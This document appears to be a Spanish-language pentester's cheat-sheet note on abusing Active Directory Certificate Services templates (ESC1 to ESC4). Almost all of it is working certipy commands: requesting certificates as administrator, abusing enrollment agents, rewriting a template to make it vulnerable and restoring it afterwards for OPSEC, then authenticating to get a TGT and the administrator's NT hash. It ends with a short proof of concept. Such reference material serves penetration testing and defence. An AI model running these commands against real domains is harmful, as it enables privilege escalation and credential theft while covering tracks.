---
aliases:
  - ESC1 ESC2 ESC3 ESC4
  - ADCS Template Abuse
tags:
  - technique/privilege-escalation
  - asset/active-directory
  - env/windows
  - service/ad-cs
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD CS Abuse]]"
  - "[[UnPAC-the-hash]]"
---
# AD CS Abuse - Template ESCs (ESC1-ESC4)

> Misconfiguraciones a nivel **plantilla de certificado**. Tras obtener el `.pfx`, autenticar con `certipy auth -pfx X.pfx -dc-ip $IP` → TGT + NT hash ([[UnPAC-the-hash]]).

---

## ESC1 — SAN + Client Auth + enroll

> Template permite Client Auth EKU + SAN especificado por el requestor + enroll de low-priv → pedir cert **como cualquier usuario**.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy req -u $U@corp.local -p $P -ca $CA -template VulnTemplate -upn administrator@corp.local -dc-ip $IP` | Cert como administrator → `administrator.pfx` | ESC1 confirmado. |
| `certipy auth -pfx administrator.pfx -dc-ip $IP` | TGT + NT hash de administrator | Tras obtener el cert. |
^adcs-esc1

## ESC2 — Any Purpose EKU

> Template con `Any Purpose` (OID `2.5.29.37.0`) o sin EKU → cert válido para todo.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy req -u $U@corp.local -p $P -ca $CA -template AnyPurposeTemplate` | Cert multiuso (client auth, code signing…) | ESC2. |
^adcs-esc2

## ESC3 — Enrollment Agent

> Cert con EKU `Certificate Request Agent` → solicitar certs **on-behalf-of** otros.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy req -u $U -p $P -ca $CA -template EnrollmentAgentTemplate` | Cert de agente de enrollment | Paso 1. |
| `certipy req -u $U -p $P -ca $CA -template User -on-behalf-of 'corp\administrator' -pfx agent.pfx` | Cert como administrator vía el agente | Paso 2. |
^adcs-esc3

## ESC4 — WriteProperty sobre Template

> Control de escritura sobre el template → reconfigurarlo a ESC1, explotar, restaurar.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy template -u $U -p $P -template VulnTemplate -save-old` | Backup de la config original | Antes de modificar. |
| `certipy template -u $U -p $P -template VulnTemplate -dc-ip $IP` | Convierte el template en ESC1-like | Hacerlo vulnerable. |
| `certipy req -u $U -p $P -ca $CA -template VulnTemplate -upn administrator@corp.local` | Explotar como ESC1 | Tras reconfigurar. |
| `certipy template -u $U -p $P -template VulnTemplate -configuration VulnTemplate.json` | Restaurar config original (OPSEC) | Cleanup. |
^adcs-esc4

### PoC ESC1 (el más común)

```bash
certipy req -u user@corp.local -p 'Pass' -ca corp-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10   # → NT hash de administrator
```
